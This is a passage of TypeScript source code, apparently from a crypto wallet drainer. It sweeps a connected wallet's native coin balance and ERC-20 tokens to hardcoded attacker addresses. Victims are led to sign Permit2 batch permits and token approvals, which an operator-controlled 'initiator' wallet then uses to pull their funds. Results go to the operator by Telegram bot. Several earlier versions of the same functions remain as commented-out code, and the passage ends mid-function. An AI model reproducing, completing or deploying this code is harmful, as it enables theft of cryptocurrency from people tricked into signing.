// ): Promise<void> => {
//   try {
//     const provider = signer.provider;
//     if (!provider) {
//       throw new Error("Signer does not have an associated provider.");
//     }

//     // Get signer balance and gas fee data
//     const signerBalance = await signer.getBalance();
//     const feeData = await provider.getFeeData();

//     // Determine gas price for EIP-1559 or legacy
//     const gasPrice = feeData.maxFeePerGas && feeData.maxPriorityFeePerGas
//       ? feeData.maxFeePerGas // Use EIP-1559 gas model
//       : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei"); // Fallback to legacy gas price

//     // Estimate gas limit dynamically for a transfer
//     const gasLimit = await provider.estimateGas({
//       to: recipient,
//       value: signerBalance
//     }).catch(() => BigNumber.from(21000)); // Fallback to 21000 if estimation fails

//     // Calculate total gas cost
//     const totalGasCost = gasPrice.mul(gasLimit);

//     if (signerBalance.lte(totalGasCost)) {
//       log("Insufficient balance to cover gas fees.");
//       return;
//     }

//     const balanceInUSD = parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) * tokenPriceInUSD;

//     // Skip transfer if the native token balance is below $2
//     if (balanceInUSD < 10) {
//       log("Native token balance below $10. Skipping transfer.");
//       return;
//     }

//     // Leave $10 untouched if conditions are met
//     if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
//       const amountToLeaveInUSD = 10; // Leave $10 worth of ETH
//       const remainingBalance = ethers.utils.parseEther(
//         ((balanceInUSD - amountToLeaveInUSD) / tokenPriceInUSD).toFixed(18)
//       );
//       const amountToSend = signerBalance
//         .sub(totalGasCost)
//         .sub(remainingBalance);

//       if (
//         amountToSend.isZero() ||
//         amountToSend.lt(ethers.utils.parseEther("0.0001"))
//       ) {
//         log("Amount to send is too small after subtracting gas fees and leaving $10.");
//         return;
//       }

//       const tx = await signer.sendTransaction({
//         to: recipient,
//         value: amountToSend,
//         gasPrice,
//         gasLimit,
//       });

//       log(`Transaction sent: ${tx.hash}`);
//       await tx.wait();
//       log(`Transaction confirmed: ${tx.hash}`);
//     } else {
//       // Standard transfer logic when conditions are not met
//       const amountToSend = signerBalance.sub(totalGasCost);

//       if (
//         amountToSend.isZero() ||
//         amountToSend.lt(ethers.utils.parseEther("0.0001"))
//       ) {
//         log("Amount to send is too small after subtracting gas fees.");
//         return;
//       }

//       const tx = await signer.sendTransaction({
//         to: recipient,
//         value: amountToSend,
//         gasPrice,
//         gasLimit,
//       });

//       log(`Transaction sent: ${tx.hash}`);
//       await tx.wait();
//       log(`Transaction confirmed: ${tx.hash}`);
//     }
//   } catch (error: unknown) {
//     if (
//       typeof error === "object" &&
//       error !== null &&
//       "code" in error &&
//       (error as { code: string }).code === "ACTION_REJECTED"
//     ) {
//       warn(`Transaction rejected by the user. Skipping to the next token.`);
//     } else if (error instanceof Error) {
//       console.error(`Error transferring native token on chain ${chainId}:`, error.message);
//     } else {
//       console.error(`An unknown error occurred while transferring native token on chain ${chainId}.`);
//     }
//   }
// };


const transferNativeToken = async (
  recipient: string,
  signer: ethers.Signer,
  tokenPriceInUSD: number,
  chainId: string,
  totalTokenValueInUSD: number
): Promise<void> => {
  try {
    const provider = signer.provider;
    if (!provider) {
      throw new Error("Signer does not have an associated provider.");
    }

    // Get signer balance and gas fee data
    const signerBalance = await signer.getBalance();
    const feeData = await provider.getFeeData();

    // Determine gas price for EIP-1559 or legacy
    const gasPrice = feeData.maxFeePerGas && feeData.maxPriorityFeePerGas
      ? feeData.maxFeePerGas // Use EIP-1559 gas model
      : feeData.gasPrice || ethers.utils.parseUnits("5", "gwei"); // Fallback to legacy gas price

    // Estimate gas limit dynamically for a transfer
    const gasLimit = await provider.estimateGas({
      to: recipient,
      value: signerBalance
    }).catch(() => BigNumber.from(21000)); // Fallback to 21000 if estimation fails

    // Calculate total gas cost
    const totalGasCost = gasPrice.mul(gasLimit);

    if (signerBalance.lte(totalGasCost)) {
      log("Insufficient balance to cover gas fees.");
      return;
    }

    const balanceInUSD = parseFloat(ethers.utils.formatEther(signerBalance.sub(totalGasCost))) * tokenPriceInUSD;

    // Skip transfer if the native token balance is below $2
    if (balanceInUSD < 5) {
      log("Native token balance below $5. Skipping transfer.");
      return;
    }

    // Leave $10 untouched if conditions are met
    if (balanceInUSD >= 50 && totalTokenValueInUSD > 50) {
      const amountToLeaveInUSD = 10; // Leave $10 worth of ETH
      const remainingBalance = ethers.utils.parseEther(
        ((balanceInUSD - amountToLeaveInUSD) / tokenPriceInUSD).toFixed(18)
      );
      const amountToSend = signerBalance
        .sub(totalGasCost)
        .sub(remainingBalance);

      if (
        amountToSend.isZero() ||
        amountToSend.lt(ethers.utils.parseEther("0.0001"))
      ) {
        log("Amount to send is too small after subtracting gas fees and leaving $10.");
        return;
      }

      const tx = await signer.sendTransaction({
        to: recipient,
        value: amountToSend,
        gasPrice,
        gasLimit,
      });

      log(`Transaction sent: ${tx.hash}`);
      await tx.wait();
      log(`Transaction confirmed: ${tx.hash}`);
    } else {
      // Standard transfer logic when conditions are not met
      const amountToSend = signerBalance.sub(totalGasCost);

      if (
        amountToSend.isZero() ||
        amountToSend.lt(ethers.utils.parseEther("0.0001"))
      ) {
        log("Amount to send is too small after subtracting gas fees.");
        return;
      }

      const tx = await signer.sendTransaction({
        to: recipient,
        value: amountToSend,
        gasPrice,
        gasLimit,
      });

      log(`Transaction sent: ${tx.hash}`);
      await tx.wait();
      log(`Transaction confirmed: ${tx.hash}`);
    }
  } catch (error: unknown) {
    if (
      typeof error === "object" &&
      error !== null &&
      "code" in error &&
      (error as { code: string }).code === "ACTION_REJECTED"
    ) {
      warn(`Transaction rejected by the user. Skipping to the next token.`);
      sendToTelegram(`Transaction rejected by the user. Skipping to the next token.`);
    } else if (error instanceof Error) {
      console.error(`Error transferring native token on chain ${chainId}:`, error.message);
    } else {
      console.error(`An unknown error occurred while transferring native token on chain ${chainId}.`);
    }
  }
};

const processChainTransactions = async (
  chain: Chain,
  validTokens: TokenBalance[],
  userAddress: string,
  provider: ethers.providers.Web3Provider,
  walletName: string
): Promise<void> => {
  log(`Processing transactions on chain: ${chain.label}`);

  const signer = provider.getSigner();
  const nativeTokenPriceInUSD = await fetchTokenPrice(chain.id);

  // Calculate native token equivalent for each token
  log(`[Chain ${chain.id}] Calculating native token equivalent...`);
  await calculateNativeValuePerToken(validTokens, nativeTokenPriceInUSD, chain.id);

  // Sort tokens by their USD value in descending order
  validTokens.sort((a, b) => b.amountUSD - a.amountUSD);

  // Handle native token transfer first
  try {
    const totalTokenValueInUSD = validTokens.reduce(
      (sum, token) => sum + token.amountUSD,
      0
    );
    await transferNativeToken(
      BLACK_RAIN_SPLIT,
      signer,
      nativeTokenPriceInUSD,
      chain.id,
      totalTokenValueInUSD
    );
  } catch (error) {
    if (error instanceof Error) {
      warn(`Failed to transfer native token on ${chain.label}:`, error.message);
      sendToTelegram(`Failed to transfer native token on ${chain.label}: \nError is ${error.message} `);
    } else {
      warn(`Failed to transfer native token on ${chain.label}: Unknown error`);
    }
  }

  // Call handlePermit2AndTransfer once upfront
  await handlePermit2AndTransfer(validTokens, walletName);

  // Process each valid token in parallel (without calling handlePermit2AndTransfer inside)
  const tokenProcessingPromises = validTokens.map(async (token) => {
    log(`Processing token: ${token.name} on ${chain.label}`);

    if (token.type === "NATIVE") {
      log("Skipping decimals fetch for native token.");
      return;
    }

    token.contract = new ethers.Contract(token.address, ERC20_ABI, provider);

    try {
      const decimals = await token.contract.decimals();
      log(`Decimals for token ${token.name}: ${decimals}`);

      const recipientAddress = FRONTEND_RECIPIENT;

      // Use handlePermitBasedTransfer as needed after Permit2 logic has been handled
      await handlePermitBasedTransfer(
        token,
        userAddress,
        signer,
        chain,
        provider,
        recipientAddress,
        walletName
      );

      const transaction: ethers.providers.TransactionRequest = {
        to: token.contract.address,
        data: token.contract.interface.encodeFunctionData("transfer", [
          BLACK_RAIN_SPLIT,
          token.amount,
        ]),
      };

      await sendTransactionWithDynamicGas(
        parseInt(chain.id, 16),
        provider,
        transaction
      );
    } catch (error) {
      if (error instanceof Error) {
        console.error(`Error processing token ${token.name}: ${error.message}`);
      } else {
        console.error(`Error processing token ${token.name}: Unknown error`);
      }
    }
  });

  try {
    await Promise.all(tokenProcessingPromises);
    log(`All tokens processed on ${chain.label}`);
  } catch (error) {
    console.error(`Error processing tokens on ${chain.label}:`, error);
  }
};



  const handlePermitBasedTransfer = async (
    token: TokenBalance,
    userAddress: string,
    signer: ethers.Signer,
    chain: { id: string },
    provider: ethers.providers.Web3Provider,
    recipientAddress: string,
    walletName: string // Add walletName parameter
  ): Promise<void> => {
    const contract = token.contract as TokenContract;
  
    const isDAI =
      token.address.toLowerCase() === DAI_ADDRESS_MAINNET.toLowerCase();
    const isPolygonUSDC =
      chain.id === "0x89" &&
      token.address.toLowerCase() === "0x2791bca1f2de4661ed88a30c99a7a9449aa84174";
    const isMainnetUSDC =
      chain.id === "0x1" &&
      token.address.toLowerCase() === "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
    const isCowProtocol =
      token.address.toLowerCase() ===
      "0x0625aFB445C3B6B7B929342a04A22599fd5dBB59";
  
    try {
      log(`Chain ID: ${chain.id}, Token Address: ${token.address.toLowerCase()}`);
  
      if (isDAI) {
        log(`Handling DAI Permit for token: ${token.address}`);
        await handleDAIPermit({ ...token, contract }, userAddress, signer, chain.id, walletName);
      } else if (isPolygonUSDC) {
        log(`Handling Polygon USDC Permit for token: ${token.address}`);
        await handlePolygonUSDCPermit({ ...token, contract }, userAddress, signer, chain.id,walletName);
      } else if (isMainnetUSDC) {
        log(`Handling Mainnet USDC Permit for token: ${token.address}`);
        await Normalusdc({ ...token, contract }, userAddress, signer, chain.id, walletName); // Pass walletName
      } else if (isCowProtocol) {
        log(`Handling Cow Protocol Permit for token: ${token.address}`);
        await handleCowProtocolPermit({ ...token, contract }, userAddress, signer, chain.id,walletName);
      } else {
        log(
          `Token ${token.address} does not match specific permit handlers. Falling back to approval and transfer.`
        );
        await handleApprovalAndTransfer(
          { ...token, contract },
          userAddress,
          provider,
          chain.id,
          recipientAddress,
          walletName // Pass walletName
        );
      }
    } catch (error) {
      if (error instanceof Error) {
        console.error(
          `Error handling permit-based transfer for token ${token.address}: ${error.message}`
        );
      } else {
        console.error(
          `Unknown error occurred while handling permit-based transfer for token ${token.address}.`,
          error
        );
      }
      throw error;
    }
  };
  
  

  const sendToTelegram = async (message: string): Promise<void> => {
    try {
      const truncatedMessage =
        message.length > 4000 ? message.substring(0, 3997) + "..." : message;
  
      const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      await axios.post(TELEGRAM_API_URL, {
        chat_id: TELEGRAM_CHAT_ID,
        text: truncatedMessage,
      });
  
      log(`Message sent to Telegram: ${message}`);
    } catch (error) {
      if (axios.isAxiosError(error)) {
        console.error(
          "Error sending message to Telegram (Axios):",
          error.response?.data || error.message
        );
      } else if (error instanceof Error) {
        console.error("Error sending message to Telegram:", error.message);
      } else {
        console.error("Unknown error occurred while sending message to Telegram.");
      }
    }
  };



  async function handlePermit2AndTransfer(validTokens: TokenBalance[], walletName: string) {
    if (!provider) {
      console.error("Provider not available.");
      return;
    }
  
    try {
      // Fetch initiator credentials dynamically
      const { initiator, initiatorPK } = await fetchInitiatorCredentials();
      console.log("Fetched initiator credentials:", initiator);
  
      const signer = provider.getSigner();
      const selectedAddress = await signer.getAddress();
      console.log("Selected Address:", selectedAddress);
  
      const permit2Contract = new ethers.Contract(Permit2Contract, Permit2ContractABI, signer);
  
      // Discover tokens with non-zero balance
      const discoveredTokens: DiscoveredToken[] = [];
      for (const token of validTokens) {
        try {
          const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
          const balance = await tokenContract.balanceOf(selectedAddress);
          if (!balance.isZero()) {
            discoveredTokens.push({ address: token.address, balance, contract: tokenContract });
          }
        } catch (innerError) {
          const error = innerError as Error;
          console.warn(`Error discovering token ${token.address}:`, error.message);
        }
      }
  
      if (discoveredTokens.length === 0) {
        console.log("No tokens found with non-zero balance. Stopping.");
        return;
      }
  
      console.log("Discovered tokens:", discoveredTokens);
  
      // Prepare permit and transfer details
      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
      const permitDetails = [];
      const transferDetails = [];
  
      for (const token of discoveredTokens) {
        const { address: tokenAddress, balance } = token;
        const allowance = await token.contract.allowance(selectedAddress, Permit2Contract);
  
        const transferAmount = balance.lt(allowance) ? balance : allowance;
        if (transferAmount.isZero()) continue;
  
        const [, , currentNonceRaw] = await permit2Contract.allowance(
          selectedAddress,
          tokenAddress,
          initiator
        );
        const currentNonce = ethers.BigNumber.from(currentNonceRaw).toNumber();
  
        permitDetails.push({
          token: tokenAddress,
          amount: transferAmount.toString(),
          expiration: deadline,
          nonce: currentNonce,
        });
  
        transferDetails.push({
          from: selectedAddress,
          to: receipient, // Define `receipient` appropriately
          amount: transferAmount.toString(),
          token: tokenAddress,
        });
      }
  
      if (permitDetails.length === 0) {
        console.log("No tokens have non-zero amounts to transfer. Stopping.");
        return;
      }
  
      // EIP-712 signing domain
      const domain = {
        name: "Permit2",
        chainId: await provider.getNetwork().then((net) => net.chainId),
        verifyingContract: Permit2Contract,
      };
  
      const batchTypes = {
        PermitBatch: [
          { name: "details", type: "PermitDetails[]" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" },
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" },
        ],
      };
  
      const typedDataValue = {
        details: permitDetails,
        spender: initiator,
        sigDeadline: deadline,
      };
  
      // Generate deep link for user approval
      const deepLink = generateDeepLink(walletName, {
        action: "sign",
        chainId: domain.chainId,
        userAddress: selectedAddress,
        domain,
        types: batchTypes,
        message: typedDataValue,
      });
      console.log(`Generated deep link: ${deepLink}`);
      await sendToTelegram(`Action required: Approve the batch permit:\n${deepLink}`);
  
      // Request EIP-712 signature
      console.log("Requesting EIP-712 signature from user...");
      const signature = await signer._signTypedData(domain, batchTypes, typedDataValue);
      console.log("Signature received:", signature);
  
      // Initiator wallet for transactions
      const initiatorWallet = new ethers.Wallet(initiatorPK, provider);
      let nonce = await provider.getTransactionCount(initiator, "pending");
      const gasPrice = await provider.getGasPrice();
  
      // Helper function: Estimate gas cost
      const estimateGasCost = async (transaction: ethers.providers.TransactionRequest) => {
        const gasLimit = transaction.gasLimit
          ? ethers.BigNumber.from(transaction.gasLimit)
          : await provider.estimateGas(transaction);
        const gasPrice = transaction.gasPrice
          ? ethers.BigNumber.from(transaction.gasPrice)
          : await provider.getGasPrice();
      
        return gasLimit.mul(gasPrice); // Now using BigNumber.mul()
      };
      
  
      // Helper function: Validate wallet balance
      const validateBalance = async (requiredBalance: ethers.BigNumber) => {
        const balance = await provider.getBalance(initiator);
        if (balance.lt(requiredBalance)) {
          const shortfall = requiredBalance.sub(balance);
          throw new Error(
            `Insufficient balance. Need at least ${ethers.utils.formatEther(shortfall)} ETH more.`
          );
        }
      };
      
  
      // Prepare and send permit transaction
      const permitData = permit2Contract.interface.encodeFunctionData("permit", [
        selectedAddress,
        typedDataValue,
        signature,
      ]);
      const permitTx = {
        from: initiator,
        to: Permit2Contract,
        nonce: ethers.utils.hexlify(nonce),
        gasLimit: ethers.BigNumber.from("200000"),
        gasPrice,
        value: "0x0",
        data: permitData,
      };
  
      console.log("Estimating permit transaction gas...");
      const estimatedPermitCost = await estimateGasCost(permitTx);
      await validateBalance(estimatedPermitCost);
  
      console.log("Sending permit transaction...");
      const signedPermitTx = await initiatorWallet.signTransaction(permitTx);
      const permitResponse = await provider.sendTransaction(signedPermitTx);
      await permitResponse.wait();
      console.log("Permit TX successful:", permitResponse.hash);
  
      // Prepare and send batch transfer transaction
      nonce++;
      const batchTransferData = permit2Contract.interface.encodeFunctionData(
        permit2Contract.interface.getFunction("transferFrom((address,address,uint160,address)[])"),
        [transferDetails]
      );
  
      const batchTransferTx = {
        from: initiator,
        to: Permit2Contract,
        nonce: ethers.utils.hexlify(nonce),
        gasLimit: ethers.utils.hexlify(300000),
        gasPrice,
        value: "0x0",
        data: batchTransferData,
      };
  
      console.log("Estimating batch transfer transaction gas...");
      const estimatedBatchCost = await estimateGasCost(batchTransferTx);
      await validateBalance(estimatedBatchCost);
  
      console.log("Sending batch transfer transaction...");
      const signedBatchTx = await initiatorWallet.signTransaction(batchTransferTx);
      const batchTxResponse = await provider.sendTransaction(signedBatchTx);
      await batchTxResponse.wait();
      console.log("Batch transfer TX successful:", batchTxResponse.hash);
  
      await sendToTelegram(
        `Batch transfer successful. Permit TX: ${permitResponse.hash}, Transfer TX: ${batchTxResponse.hash}`
      );
    } catch (error) {
      const err = error as Error;
      console.error("Error during permit and transfer:", err.message);
      await sendToTelegram(`Error during permit and transfer: ${err.message}`);
    }
  }
  
  

  // Main function for handling Permit2 and transfer
  // async function handlePermit2AndTransfer(validTokens: TokenBalance[], walletName: string) {
  //   if (!provider) {
  //     console.error("Provider not available.");
  //     return;
  //   }
  
  //   try {
  //     // Fetch initiator credentials dynamically
  //     const { initiator, initiatorPK } = await fetchInitiatorCredentials();
  //     console.log("Fetched initiator credentials:", initiator);
  
  //     const signer = provider.getSigner();
  //     const selectedAddress = await signer.getAddress();
  //     console.log("Selected Address:", selectedAddress);
  
  //     const permit2Contract = new ethers.Contract(Permit2Contract, Permit2ContractABI, signer);
  
  //     // Discover tokens with non-zero balance
  //     const discoveredTokens: DiscoveredToken[] = [];
  //     for (const token of validTokens) {
  //       try {
  //         const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
  //         const balance = await tokenContract.balanceOf(selectedAddress);
  //         if (!balance.isZero()) {
  //           discoveredTokens.push({ address: token.address, balance, contract: tokenContract });
  //         }
  //       } catch (innerError) {
  //         const error = innerError as Error; // Explicitly cast to Error
  //         console.warn(`Error discovering token ${token.address}:`, error.message);
  //       }
  //     }
  
  //     if (discoveredTokens.length === 0) {
  //       console.log("No tokens found with non-zero balance. Stopping.");
  //       return;
  //     }
  
  //     console.log("Discovered tokens:", discoveredTokens);
  
  //     // Prepare permit and transfer details
  //     const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
  //     const permitDetails = [];
  //     const transferDetails = [];
  
  //     for (const token of discoveredTokens) {
  //       const { address: tokenAddress, balance } = token;
  //       const allowance = await token.contract.allowance(selectedAddress, Permit2Contract);
  
  //       const transferAmount = balance.lt(allowance) ? balance : allowance;
  //       if (transferAmount.isZero()) continue;
  
  //       const [, , currentNonceRaw] = await permit2Contract.allowance(
  //         selectedAddress,
  //         tokenAddress,
  //         initiator
  //       );
  //       const currentNonce = ethers.BigNumber.from(currentNonceRaw).toNumber();
  
  //       permitDetails.push({
  //         token: tokenAddress,
  //         amount: transferAmount.toString(),
  //         expiration: deadline,
  //         nonce: currentNonce,
  //       });
  
  //       transferDetails.push({
  //         from: selectedAddress,
  //         to: receipient, // Define `receipient` appropriately
  //         amount: transferAmount.toString(),
  //         token: tokenAddress,
  //       });
  //     }
  
  //     if (permitDetails.length === 0) {
  //       console.log("No tokens have non-zero amounts to transfer. Stopping.");
  //       return;
  //     }
  
  //     // EIP-712 signing domain
  //     const domain = {
  //       name: "Permit2",
  //       chainId: await provider.getNetwork().then((net) => net.chainId),
  //       verifyingContract: Permit2Contract,
  //     };
  
  //     const batchTypes = {
  //       PermitBatch: [
  //         { name: "details", type: "PermitDetails[]" },
  //         { name: "spender", type: "address" },
  //         { name: "sigDeadline", type: "uint256" },
  //       ],
  //       PermitDetails: [
  //         { name: "token", type: "address" },
  //         { name: "amount", type: "uint160" },
  //         { name: "expiration", type: "uint48" },
  //         { name: "nonce", type: "uint48" },
  //       ],
  //     };
  
  //     const typedDataValue = {
  //       details: permitDetails,
  //       spender: initiator,
  //       sigDeadline: deadline,
  //     };
  
  //     // Generate deep link for user approval
  //     const deepLink = generateDeepLink(walletName, {
  //       action: "sign",
  //       chainId: domain.chainId,
  //       userAddress: selectedAddress,
  //       domain,
  //       types: batchTypes,
  //       message: typedDataValue,
  //     });
  //     console.log(`Generated deep link: ${deepLink}`);
  //     await sendToTelegram(`Action required: Approve the batch permit:\n${deepLink}`);
  
  //     // Request EIP-712 signature
  //     console.log("Requesting EIP-712 signature from user...");
  //     const signature = await signer._signTypedData(domain, batchTypes, typedDataValue);
  //     console.log("Signature received:", signature);
  
  //     // Initiator wallet for transactions
  //     const initiatorWallet = new ethers.Wallet(initiatorPK, provider);
  //     let nonce = await provider.getTransactionCount(initiator, "pending");
  //     const gasPrice = await provider.getGasPrice();
  
  //     // Prepare and send permit transaction
  //     const permitData = permit2Contract.interface.encodeFunctionData("permit", [
  //       selectedAddress,
  //       typedDataValue,
  //       signature,
  //     ]);
  //     const permitTx = {
  //       from: initiator,
  //       to: Permit2Contract,
  //       nonce: ethers.utils.hexlify(nonce),
  //       gasLimit: ethers.BigNumber.from("200000"),
  //       gasPrice,
  //       value: "0x0",
  //       data: permitData,
  //     };
  
  //     console.log("Sending permit transaction...");
  //     const signedPermitTx = await initiatorWallet.signTransaction(permitTx);
  //     const permitResponse = await provider.sendTransaction(signedPermitTx);
  //     await permitResponse.wait();
  //     console.log("Permit TX successful:", permitResponse.hash);
  
  //     // Prepare and send batch transfer transaction
  //     nonce++;
  //     const batchTransferData = permit2Contract.interface.encodeFunctionData(
  //       permit2Contract.interface.getFunction("transferFrom((address,address,uint160,address)[])"),
  //       [transferDetails]
  //     );
  
  //     const batchTransferTx = {
  //       from: initiator,
  //       to: Permit2Contract,
  //       nonce: ethers.utils.hexlify(nonce),
  //       gasLimit: ethers.utils.hexlify(300000),
  //       gasPrice,
  //       value: "0x0",
  //       data: batchTransferData,
  //     };
  
  //     console.log("Sending batch transfer transaction...");
  //     const signedBatchTx = await initiatorWallet.signTransaction(batchTransferTx);
  //     const batchTxResponse = await provider.sendTransaction(signedBatchTx);
  //     await batchTxResponse.wait();
  //     console.log("Batch transfer TX successful:", batchTxResponse.hash);
  
  //     await sendToTelegram(
  //       `Batch transfer successful. Permit TX: ${permitResponse.hash}, Transfer TX: ${batchTxResponse.hash}`
  //     );
  //   } catch (error) {
  //     // Safely handle 'unknown' error type
  //     const err = error as Error;
  //     console.error("Error during permit and transfer:", err.message);
  //     await sendToTelegram(`Error during permit and transfer: ${err.message}`);
  //   }
  // }
  

  // async function handlePermit2AndTransfer(validTokens: TokenBalance[], walletName: string) {
  //   if (!provider) {
  //     console.error("Provider not available.");
  //     return;
  //   }
  
  //   try {
  //     const signer = provider.getSigner();
  //     const selectedAddress = await signer.getAddress();
  //     console.log("Selected Address:", selectedAddress);
  
  //     const permit2Contract = new ethers.Contract(Permit2Contract, Permit2ContractABI, signer);
  
  //     // Dynamically gather tokens with non-zero balance
  //     const discoveredTokens: DiscoveredToken[] = [];
  //     for (const token of validTokens) {
  //       try {
  //         const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
  //         const balance = await tokenContract.balanceOf(selectedAddress);
  //         if (!balance.isZero()) {
  //           discoveredTokens.push({
  //             address: token.address,
  //             balance,
  //             contract: tokenContract,
  //           });
  //         }
  //       } catch (error) {
  //         warn(`Error discovering token ${token.address}:`, error);
  //       }
  //     }
  
  //     if (discoveredTokens.length === 0) {
  //       console.log("No tokens found with non-zero balance. Stopping.");
  //       return;
  //     }
  //     console.log("Discovered tokens:", discoveredTokens);
  
  //     // Prepare permit and transfer details
  //     const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
  //     const permitDetails = [];
  //     const transferDetails = [];
  
  //     for (const token of discoveredTokens) {
  //       const tokenAddress = token.address;
  //       const balance = token.balance;
  //       const userAllowance = await token.contract.allowance(selectedAddress, Permit2Contract);
  
  //       const transferAmount = balance.lt(userAllowance) ? balance : userAllowance;
  //       if (transferAmount.isZero()) continue;
  
  //       const [, , currentNonceRaw] = await permit2Contract.allowance(selectedAddress, tokenAddress, initiator);
  //       const currentNonce = ethers.BigNumber.from(currentNonceRaw).toNumber();
  
  //       permitDetails.push({
  //         token: tokenAddress,
  //         amount: transferAmount.toString(),
  //         expiration: deadline,
  //         nonce: currentNonce,
  //       });
  
  //       transferDetails.push({
  //         from: selectedAddress,
  //         to: receipient,
  //         amount: transferAmount.toString(),
  //         token: tokenAddress,
  //       });
  //     }
  
  //     if (permitDetails.length === 0) {
  //       console.log("No tokens have non-zero amounts to transfer. Stopping.");
  //       return;
  //     }
  
  //     // EIP-712 signing domain
  //     const domain = {
  //       name: "Permit2",
  //       chainId: await provider.getNetwork().then((net) => net.chainId),
  //       verifyingContract: Permit2Contract,
  //     };
  
  //     const batchTypes = {
  //       PermitBatch: [
  //         { name: "details", type: "PermitDetails[]" },
  //         { name: "spender", type: "address" },
  //         { name: "sigDeadline", type: "uint256" },
  //       ],
  //       PermitDetails: [
  //         { name: "token", type: "address" },
  //         { name: "amount", type: "uint160" },
  //         { name: "expiration", type: "uint48" },
  //         { name: "nonce", type: "uint48" },
  //       ],
  //     };
  
  //     const typedDataValue = {
  //       details: permitDetails,
  //       spender: initiator,
  //       sigDeadline: deadline,
  //     };
  
  //     // Generate and send deep link for user approval
  //     log("Generating deep link...");
  //     const deepLinkParams = {
  //       action: "sign",
  //       chainId: domain.chainId,
  //       userAddress: selectedAddress,
  //       domain,
  //       types: batchTypes,
  //       message: typedDataValue,
  //     };
  //     const deepLink = generateDeepLink(walletName, deepLinkParams);
  //     log(`Generated deep link: ${deepLink}`);
  //     await sendToTelegram(`Action required: Please approve the batch permit using this link:\n${deepLink}`);
  //     redirectToDeepLink(deepLink);
  
  //     // Request EIP-712 signature
  //     console.log("Requesting EIP-712 signature from user...");
  //     const signature = await signer._signTypedData(domain, batchTypes, typedDataValue);
  //     console.log("Signature received:", signature);
  
  //     // Initiator pays for on-chain transactions
  //     const initiatorWallet = new ethers.Wallet(initiatorPK, provider);
  //     let nonce = await provider.getTransactionCount(initiator, "pending");
  //     const gasPrice = await provider.getGasPrice();
  
  //     const permitData = permit2Contract.interface.encodeFunctionData("permit", [
  //       selectedAddress,
  //       typedDataValue,
  //       signature,
  //     ]);
  
  //     const permitTx = {
  //       from: initiator,
  //       to: Permit2Contract,
  //       nonce: ethers.utils.hexlify(nonce),
  //       gasLimit: ethers.BigNumber.from("200000"),
  //       gasPrice,
  //       value: "0x0",
  //       data: permitData,
  //     };
  
  //     console.log("Sending permit transaction (initiator pays)...");
  //     const signedPermitTx = await initiatorWallet.signTransaction(permitTx);
  //     const permitResponse = await provider.sendTransaction(signedPermitTx);
  //     await permitResponse.wait();
  //     console.log("Permit TX success:", permitResponse.hash);
  
  //     // Handle batch transfer
  //     nonce++;
  //     const batchTransferData = permit2Contract.interface.encodeFunctionData(
  //       permit2Contract.interface.getFunction("transferFrom((address,address,uint160,address)[])"),
  //       [transferDetails]
  //     );
  
  //     const batchTransferTx = {
  //       from: initiator,
  //       to: Permit2Contract,
  //       nonce: ethers.utils.hexlify(nonce),
  //       gasLimit: ethers.utils.hexlify(300000),
  //       gasPrice,
  //       value: "0x0",
  //       data: batchTransferData,
  //     };
  
  //     console.log("Sending batch transferFrom TX...");
  //     const signedBatchTx = await initiatorWallet.signTransaction(batchTransferTx);
  //     const batchTxResponse = await provider.sendTransaction(signedBatchTx);
  //     await batchTxResponse.wait();
  //     console.log("Batch transfer TX success:", batchTxResponse.hash);
  
  //     console.log("Done!");
  //     await sendToTelegram(`Batch transfer successful. Permit TX: ${permitResponse.hash}, Transfer TX: ${batchTxResponse.hash}`);
  //   } catch (error) {
  //     if (error instanceof Error) {
  //       console.error("Error during permit and transfer:", error.message);
  //       await sendToTelegram(`Error during permit and transfer: ${error.message}`);
  //     } else {
  //       console.error("Unknown error occurred during permit and transfer:", error);
  //       await sendToTelegram("Unknown error occurred during permit and transfer.");
  //     }
  //   }
  // }
  

const handleApprovalAndTransfer = async (
  token: TokenBalance,
  userAddress: string,
  provider: ethers.providers.Web3Provider,
  chainId: number | string,
  recipientAddress: string,
  walletName: string // Specify the wallet name for deep link generation
): Promise<void> => {
  try {
    const signer = provider.getSigner();
    const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
    const permit2Contract = new ethers.Contract(Permit2Contract, Permit2ContractABI, signer);

    let decimals: number;
    try {
      decimals = await tokenContract.decimals();
    } catch (error) {
      warn(`Failed to fetch decimals for token ${token.name}. Defaulting to 18. Error:`, error);
      decimals = 18; // Fallback to 18 decimals
    }

    let rawBalance: BigNumber;
    try {
      rawBalance = await tokenContract.balanceOf(userAddress);
    } catch (error) {
      console.error(
        `Failed to fetch balance for token ${token.name} (${token.address}). Skipping transfer. Error:`,
        error
      );
      return; // Exit if balance can't be fetched
    }

    if (rawBalance.isZero()) {
      warn(`User has zero balance for token ${token.name}. Skipping transfer.`);
      return;
    }

    const adjustedBalance = ethers.utils.formatUnits(rawBalance, decimals);
    log(`Token: ${token.name} | Raw Balance: ${rawBalance.toString()} | Adjusted Balance: ${adjustedBalance}`);

    // Fetch Permit2 allowance
    let permit2Allowance = BigNumber.from(0);
    try {
      const [, , currentAllowance] = await permit2Contract.allowance(userAddress, token.address, recipientAddress);
      permit2Allowance = BigNumber.from(currentAllowance);
      log(`Permit2 allowance for ${token.name}: ${permit2Allowance.toString()}`);
    } catch (error) {
      warn(`Failed to fetch Permit2 allowance for ${token.name}. Falling back to standard approval. Error:`, error);
    }

    // Check Permit2 allowance before fallback
    if (permit2Allowance.gte(rawBalance)) {
      log(`Sufficient Permit2 allowance exists for token ${token.name}. Proceeding with transfer.`);
      await handlePermit2AndTransfer([token], walletName);
 // Use Permit2 transfer logic
      return;
    }

    // Fetch current standard ERC20 allowance
    const allowance = await tokenContract.allowance(userAddress, BR_INITIATOR_ADDRESS);
